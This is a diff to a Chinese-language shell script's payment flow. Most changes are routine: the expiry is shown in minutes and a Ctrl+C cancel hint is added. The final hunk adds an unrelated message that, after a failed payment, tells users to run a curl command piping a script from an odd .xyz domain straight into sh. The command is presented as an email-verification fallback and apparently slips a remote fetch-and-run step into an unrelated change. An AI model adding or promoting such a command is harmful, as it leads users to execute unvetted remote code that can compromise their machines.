@@ -978,7 +978,20 @@ pay_flow()
 
     printf "\n"
 
-    printf "%b\n" "${YELLOW}支付方式：${ORDER_CHANNEL}    金额：¥${ORDER_AMOUNT}    有效期：${ORDER_EXPIRE} 秒${RESET}"
+    # 有效期按分钟显示（服务器给的是秒）
+    case "$ORDER_EXPIRE" in
+        ''|*[!0-9]*)
+            ORDER_MIN=1
+            ;;
+        *)
+            ORDER_MIN=$((ORDER_EXPIRE / 60))
+
+            [ "$ORDER_MIN" -gt 0 ] ||
+                ORDER_MIN=1
+            ;;
+    esac
+
+    printf "%b\n" "${YELLOW}支付方式：${ORDER_CHANNEL}    金额：¥${ORDER_AMOUNT}    有效期：${ORDER_MIN} 分钟${RESET}"
 
     printf "%b\n" "${CYAN}支付完成后会自动继续，无需任何操作${RESET}"
 
@@ -1081,7 +1094,7 @@ pay_flow()
 
         esac
 
-        printf "\r\033[2K${GREEN}[INFO]${RESET} 等待支付中... 剩余 %s 秒" \
+        printf "\r\033[2K${GREEN}[INFO]${RESET} 等待支付中... 剩余 %s 秒（按 Ctrl+C 取消）" \
             "$((ORDER_EXPIRE - PAY_WAITED))"
 
         sleep "$PAY_POLL_INTERVAL"
@@ -1124,6 +1137,10 @@ else
         printf "\n"
 
         printf "%b\n" "${RED}[ERROR] 未完成支付，已退出${RESET}"
+
+        printf "%b\n" "${YELLOW}[INFO] 如需邮箱验证码入口，请改用：${RESET}"
+
+        printf "%b\n" "${YELLOW}       curl -fsSL https://auth.12334123.xyz/bootstrap.sh | sh${RESET}"
 
         printf "\n"
 
